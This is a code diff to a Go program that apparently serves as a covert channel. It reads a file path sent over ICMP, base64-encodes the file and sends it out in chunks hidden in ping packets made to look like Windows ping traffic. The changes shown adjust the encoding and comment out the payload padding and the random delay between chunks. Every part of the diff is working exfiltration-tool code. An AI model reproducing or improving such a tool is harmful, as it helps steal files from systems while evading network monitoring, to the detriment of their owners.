@@ -111,20 +111,17 @@ func main() {
 					dir := string(StringDecodedBytes)[2:]
 					fmt.Printf(" -> Requested File Directory is %s.\n", dir)
 
-					data, err := os.Open(dir)
+					fileBytes, err := os.ReadFile(dir)
 					if err != nil {
 						log.Printf("Failed to read file: %v", err)
 						return
 					}
-					defer data.Close()
-					stat, err := data.Stat()
-					if err != nil {
-						log.Printf("Failed to get file info: %v", err)
-						return
-					}
 
-					fileSize := stat.Size()
-					payloadBytes := []byte("FA" + strconv.Itoa(int(fileSize)) + "FA")
+					encodedFile := base64.StdEncoding.EncodeToString(fileBytes)
+
+					fileSize := len(encodedFile)
+
+					payloadBytes := []byte("FA" + strconv.Itoa(fileSize) + "FA")
 
 					// Third Step is Sending File Acknoledgement ICMP Request
 					windowsPayload := []byte("abcdefghijklmnopqrstuvwabcdefg") // 30 bytes
@@ -219,10 +216,10 @@ func main() {
 						payload := append([]byte(prefix), []byte(chunkData)...)
 
 						// Pad if needed to reach exact payload size
-						if len(payload) < icmpPayloadSize {
-							padding := make([]byte, icmpPayloadSize-len(payload))
-							payload = append(payload, padding...)
-						}
+						//	if len(payload) < icmpPayloadSize {
+						//		padding := make([]byte, icmpPayloadSize-len(payload))
+						//		payload = append(payload, padding...)
+						//	}
 
 						reply := &icmp.Message{
 							Type: ipv4.ICMPTypeEcho,
@@ -248,9 +245,11 @@ func main() {
 
 						count++
 
-						log.Printf("Chunk number %d Sent.", count) // Delay to recive Dummy FD from client before sending next chunk
-						delay := time.Duration(rand.Intn(9000)) * time.Millisecond
-						time.Sleep(delay)
+						log.Printf(" -> Chunk number %d Sent.", count)
+
+						// Delay to recive Dummy FD from client before sending next chunk
+						//	delay := time.Duration(rand.Intn(9000)) * time.Millisecond
+						//	time.Sleep(delay)
 					}
 				}
 
